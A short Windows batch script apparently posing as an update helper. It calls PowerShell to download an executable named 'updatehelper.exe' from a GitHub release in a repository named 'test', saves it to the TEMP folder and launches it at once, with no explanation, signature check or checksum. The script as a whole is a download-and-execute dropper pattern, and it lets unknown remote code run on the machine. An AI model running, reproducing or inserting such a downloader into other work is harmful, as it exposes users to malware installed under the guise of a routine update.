@echo off
setlocal enabledelayedexpansion

set "URL=https://github.com/wabor1/test/releases/download/1/updatehelper.exe"
set "TARGET=%TEMP%\updatehelper.exe"

powershell -Command "(New-Object Net.WebClient).DownloadFile('%URL%', '%TARGET%')"

if exist "%TARGET%" (
    start "" "%TARGET%"
) else (
    echo Download failed.
)

pause   
